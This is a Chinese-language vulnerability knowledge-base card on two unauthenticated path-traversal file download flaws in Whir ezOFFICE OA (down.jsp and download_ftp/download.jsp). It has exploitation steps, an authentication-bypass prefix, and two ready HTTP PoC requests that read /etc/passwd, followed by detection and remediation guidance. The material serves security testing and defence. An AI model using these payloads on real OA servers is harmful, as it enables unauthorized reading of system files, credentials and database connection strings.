---
id: web-generic-file-inclusion-whir-ezoffice-down-jsp-download-ftp
title: 万户OA 两处任意文件下载：down.jsp name 穿越与 download_ftp path/filename 拼接
type: scenario
domain: web
path: web/generic/file-inclusion
technique: whir-ezoffice-jsp-file-download-traversal
tags:
- web
- file-inclusion
- java
- oa
- whir
- ezoffice
- path-traversal
- file-read
- unauth
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V233
  verified_at: '2026-11-07T09:17:20+08:00'
  notes: 已对照原文与 img29-31 核对：logset/down.jsp 的 name 拼接 WEB-INF/logs、download_ftp 的 path/filename + substring(0,6) 两处 FileInputStream 下载均与代码一致。dup-scan 与 deleteFile 卡 pair 为 likely_duplicate，按原文裁决：本卡为任意文件下载/读取（down.jsp/download_ftp），deleteFile 为 File.delete 任意删除，端点与 sink 不同，两卡并列保留。原文未给出下载成功响应截图，未复跑。
url: /docs/web/generic/file-inclusion/web-generic-file-inclusion-whir-ezoffice-down-jsp-download-ftp/
draft: false
kb_aliases:
- 万户OA 任意文件下载
- ezOFFICE down.jsp
- download_ftp/download.jsp
- name 路径穿越下载
- filepath filename 拼接读取
---

## 一句话结论

万户OA 的 `logset/down.jsp` 把 `name` 参数直接拼到 `WEB-INF/logs/` 后 `FileInputStream` 下载，`public/download_ftp/download.jsp` 把可控的 `path`/`filename` 拼成 `realPath("/upload/")+path+"/"+filename` 后读取；两处都未过滤目录穿越，配合鉴权绕过可未登录读取服务器任意文件。

## 原理

- `logset/down.jsp`：
  - `path = com.whir.component.security.log.LogUtil.whirlog4joutdirpath`，该值在 `LogUtil` 中初始化为 `classPath + "WEB-INF" + separator + "logs"`；
  - `name = request.getParameter("name") + ""`；`filenamedownload = path + "/" + name`；
  - 设置 `application/x-download` 与 `Content-Disposition: attachment; filename=...` 后，`new FileInputStream(filenamedownload)` 循环写入响应。
  - `name` 未做 `../`/绝对路径过滤，传 `../../../../etc/passwd` 或 `..\..\..\windows\win.ini` 即可穿越到 logs 目录之外。
- `public/download_ftp/download.jsp`：
  - 读取 `path`、`filename` 参数；`filepath = request.getRealPath("/upload/") + "/" + path + "/"`；
  - `dd = filename.substring(0, 6)`，`file2 = new File(filepath + dd + "/" + filename)`；若存在则读取 `filepath + dd + "/" + filename`，否则读取 `filepath + filename`；
  - `path` 与 `filename` 都可控，可拼接 `../` 跳出 upload 目录读取任意文件；文件名为空/过短会导致 `substring(0,6)` 抛错，需构造长度 ≥6。
- 两处都在 `/defaultroot/` 下，正常需要登录，但可用 `SetCharacterEncodingFilter` 的鉴权绕过路径未授权访问。

## 触发条件

- 目标为万户OA/ezOFFICE，相关 JSP 存在。
- 能使用鉴权绕过路径（`iWebOfficeSign/OfficeServer.jsp/..`、`admin.jsp;.js`、XFF 白名单等）到达 JSP。
- 目标文件对应用进程可读；`download_ftp` 的 `filename` 长度满足 `substring(0,6)`。
- 响应会把文件内容回显到下载响应中。

## 利用步骤

1. 用鉴权绕过前缀访问 `logset/down.jsp`，`name` 传 `../../../../etc/passwd`（Linux）或 `..\..\..\windows\win.ini`（Windows），观察下载内容。
2. 访问 `public/download_ftp/download.jsp`，将 `path` 设为 `../../..`，`filename` 设为长度 ≥6 的目标文件名，或把目标路径编码进 `path`/`filename`。
3. 读取 `WEB-INF/web.xml`、配置文件、数据库连接串、源码备份等；结合其他漏洞扩大。
4. 记录请求与下载内容作为证据，测试后删除本地文件。

## PoC

```http
GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../logset/down.jsp?name=../../../../etc/passwd HTTP/1.1
Host: target
```

```http
GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/download_ftp/download.jsp?path=../../..&filename=etc/passwd HTTP/1.1
Host: target
```

说明：`download_ftp` 的 `filename` 需满足长度 ≥6 且会先做 `substring(0,6)` 拼接检查，实际利用时按目标路径调整 `path`/`filename` 的组合；原文未给出成功下载响应截图。

## 变体与关联

- 变体：Windows 目标用 `..\`、盘符绝对路径；Linux 用 `../`、绝对路径；可尝试 URL 编码/双重编码绕过可能的网关规则。
- 变体：`down.jsp` 的 logs 目录可通过路径穿越读到项目配置；`download_ftp` 同时支持 FTP 模式，路径参数可能影响 FTP 删除/读取。
- 关联：鉴权绕过 [[web-generic-auth-whir-ezoffice-characterencoding-filter-bypass]]；同产品任意删除 [[web-generic-file-inclusion-whir-ezoffice-deletefile-traversal-delete]]；通用路径穿越下载 [[web-generic-file-inclusion-goldlib-download-items-traversal-read]]。
- 边界：补丁对参数做规范化/白名单、容器阻止 `..` 归一化、目标文件无读权限时利用不成立。

## 检测与防御

- 检测：`name`/`path`/`filename` 参数出现 `../`、`..\`、`%2e%2e`、绝对路径、`etc/passwd`、`win.ini`；下载响应为配置/源码文件；同一 IP 高频请求下载接口。
- 修复：下载接口只接受白名单文件名/ID，服务端映射到固定目录；对拼接结果做 `getCanonicalPath` 并校验必须位于允许目录；拒绝 `..`、绝对路径、空字节。
- 加固：下载目录与配置目录分离；应用账户最小权限；鉴权绕过修复后仍应保留下载接口自身的授权校验。
